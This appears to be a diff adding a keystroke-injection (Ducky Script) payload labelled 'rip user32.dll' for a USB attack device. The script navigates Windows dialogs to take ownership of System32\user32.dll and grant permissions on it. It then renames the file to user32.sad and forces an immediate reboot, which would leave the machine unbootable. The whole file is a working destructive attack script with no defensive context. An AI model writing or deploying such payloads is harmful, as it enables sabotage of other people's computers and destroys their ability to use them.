@@ -1,0 +1,121 @@
+    REM rip user32.dll
+    DELAY 5000
+    GUI r
+    DELAY 700
+    STRING C:\Windows\System32\
+    DELAY 700
+    ENTER
+    DELAY 750
+    STRING user
+    DELAY 700
+    ALT ENTER
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    RIGHTARROW
+    DELAY 700
+    RIGHTARROW
+    DELAY 700
+    ALT v
+    DELAY 700
+    ALT c
+    DELAY 750
+    ALT f
+    DELAY 700
+    CONTROL c
+    DELAY 700
+    ALT e
+    DELAY 700
+    CONTROL v
+    DELAY 700
+    STRING \Users
+    DELAY 700
+    ENTER
+    DELAY 700
+    ALT a
+    DELAY 700
+    ENTER
+    DELAY 700
+    ENTER
+    DELAY 700
+    ENTER
+    DELAY 700
+    ALT ENTER
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    RIGHTARROW
+    DELAY 700
+    RIGHTARROW
+    DELAY 700
+    ALT e
+    DELAY 700
+    DOWNARROW
+    DELAY 700
+    DOWNARROW
+    DELAY 700
+    DOWNARROW
+    DELAY 700
+    DOWNARROW
+    DELAY 700
+    ALT p
+    DELAY 700
+    SPACE
+    DELAY 700
+    ALT a
+    DELAY 700
+    ALT y
+    DELAY 700
+    ENTER
+    DELAY 700
+    ENTER
+    DELAY 800
+    ALT ENTER
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    TAB
+    DELAY 700
+    STRING user32.sad
+    DELAY 700
+    ENTER
+    DELAY 800
+    ALT c
+    DELAY 750
+    LEFTARROW
+    DELAY 700
+    ENTER
+    DELAY 750 
+    GUI r
+    DELAY 700
+    STRING cmd
+    DELAY 700
+    ENTER
+    DELAY 750
+    STRING shutdown /r /t 0
+    DELAY 700
+    ENTER
